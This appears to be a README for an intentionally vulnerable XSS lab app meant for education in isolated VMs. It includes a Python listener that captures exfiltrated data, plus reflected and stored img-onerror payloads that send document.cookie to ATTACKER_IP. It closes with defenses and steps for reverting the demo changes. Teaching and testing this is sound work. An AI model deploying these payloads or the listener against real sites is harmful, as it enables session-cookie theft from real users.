# vuln-xss-app — Quick README (summary)

**Purpose:** Local, controlled vulnerability demo for Cross-Site Scripting (XSS). Use in isolated VMs only for education and assignments.

> ⚠️ Safety: Run this only in machines and networks you control. Use fake/demo data only (e.g. `session=FAKE_FOR_DEMO`). Do not target external systems.

---

## What’s included

- `pom.xml` — Maven project
- `src/main/java/...` — Spring Boot server
- `src/main/resources/static/` — front-end HTML (search.html, comments.html, etc.)
- `attacker_listener.py` — simple Python listener (lab-only)
- `DemoCookieController.java` — demo endpoint to set a JS-readable cookie (optional)

---

## Quick setup (Ubuntu VM)

1. Install prerequisites:

```bash
sudo apt update
sudo apt install -y openjdk-17-jdk maven python3 python3-pip
```

2. Build the project (from project root):

```bash
mvn clean install -U
```

3. Run the app (example port 3001):

```bash
mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=3001"
```

---

## Demo cookie (server-side) — `/set-demo-cookie`

Visit `/set-demo-cookie` to set a **demo** cookie that JavaScript can read:

```text
GET /set-demo-cookie
# sets: session=FAKE_FOR_DEMO (HttpOnly=false) — demo-only
```

**Note:** In production session cookies must be `HttpOnly`.

---

## Attacker listener (on attacker VM)

Save and run `attacker_listener.py` on the attacker VM to capture exfil requests:

```
#!/usr/bin/env python3
# attacker_listener.py  (lab-only, improved)
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _log_request(self, method):
        parsed = urlparse(self.path)
        qs = parse_qs(parsed.query)
        print(f"=== {method} received ===")
        print("Path:", parsed.path)
        if qs:
            print("Query string:")
            for k, v in qs.items():
                print(f"  {k}: {v}")
        print("Headers:")
        for k, v in self.headers.items():
            print(f"  {k}: {v}")
        print("="*30)

    def do_HEAD(self):
        # Respond similarly to GET but without a body.
        try:
            self._log_request('HEAD')
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.send_header('Content-Length', '43')  # length of the 1x1 GIF below
            self.end_headers()
        except Exception as e:
            print("Error handling HEAD:", e)
            self.send_error(500, "Server Error")

    def do_GET(self):
        try:
            self._log_request('GET')
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.end_headers()
            # 1x1 transparent GIF binary (43 bytes)
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
        except BrokenPipeError:
            # client closed connection (common with curl) — ignore silently
            pass
        except Exception as e:
            print("Error handling GET:", e)
            try:
                self.send_error(500, "Server Error")
            except:
                pass

    def do_POST(self):
        try:
            length = int(self.headers.get('content-length', 0))
            body = self.rfile.read(length).decode('utf-8', errors='replace') if length > 0 else ''
            parsed = urlparse(self.path)
            qs = parse_qs(parsed.query)
            print("=== POST received ===")
            print("Path:", parsed.path)
            if qs:
                print("Query string:")
                for k, v in qs.items():
                    print(f"  {k}: {v}")
            print("Headers:")
            for k, v in self.headers.items():
                print(f"  {k}: {v}")
            print("Body:")
            print(body)
            print("="*30)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        except Exception as e:
            print("Error handling POST:", e)
            try:
                self.send_error(500, "Server Error")
            except:
                pass

    # avoid verbose logging to stderr by BaseHTTPRequestHandler
    def log_message(self, format, *args):
        return

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 9000), Handler)
    print("Listening on http://0.0.0.0:9000 (press Ctrl+C to stop)")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down listener")
        server.server_close()
```

```bash
python3 attacker_listener.py
# listens on 0.0.0.0:9000
```

The listener logs GET/POST requests and prints query params and headers.

---

## Example attack payloads

Replace `ATTACKER_IP` with your attacker VM IP (e.g. `10.0.2.6`) and `APP_PORT` with your app port (e.g. `3001`).

**Reflected (URL) — exfiltrate cookie via img onerror**

```
http://localhost:APP_PORT/search.html?q=<img src=x onerror="new Image().src='http://ATTACKER_IP:9000/log?c='+encodeURIComponent(document.cookie)">
```

(URL-encode if pasting into address bar.)

**Stored (comment)** — post this as a comment body and reload the comments page:

```html
<img
  src="x"
  onerror="new Image().src='http://ATTACKER_IP:9000/log?c='+encodeURIComponent(document.cookie)"
/>
```

**Reliable visual payloads (for demos):**

```html
<img
  src="x"
  onerror="console.log('XSS fired'); document.body.style.border='6px solid red'"
/>
<svg/onload=console.log('svg onload fired')>
```

---

## Testing & verification

1. Start attacker listener on attacker VM: `python3 attacker_listener.py`.
2. On client (victim) browser, visit `/set-demo-cookie` to set `session=FAKE_FOR_DEMO`.
3. Trigger reflected or stored payload. Watch attacker listener log showing `c: ['session=FAKE_FOR_DEMO']`.
4. Capture screenshots: listener output, browser console showing `document.cookie`, Elements showing injected node, and the URL or posted comment with the payload.

---

## Common troubleshooting

- If `curl -I` returns "Unsupported method ('HEAD')", use the updated `attacker_listener.py` that implements `do_HEAD` (included).
- If listener gets no requests: check VM networking (host-only/internal/bridged), firewall (`ufw`), and that listener binds to `0.0.0.0`.
- If `<script>` payloads don’t execute: modern browsers often do not execute `<script>` tags inserted via `innerHTML`. Use `img onerror` or append a `script` element via Console or a demo patch.

---

## Defenses (apply after demo)

1. **Sanitize input** server-side (e.g. `Jsoup.clean(input, Safelist.none())`) before storing or reflecting.
2. **Escape output** on frontend: use `element.textContent = userInput` instead of `innerHTML`.
3. **Set HttpOnly** on session cookies so `document.cookie` cannot read them.
4. **Content-Security-Policy** header to block inline JS (as second line of defense).
5. Add security headers: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`.

---

## Reverting demo changes (must do)

- Remove `DemoCookieController` or set cookie to `HttpOnly=true`.
- Revert any demo-only front-end code that auto-executes script content from query params or stored comments.
- Replace any `innerHTML` use for untrusted data with `textContent` or sanitized HTML.

*
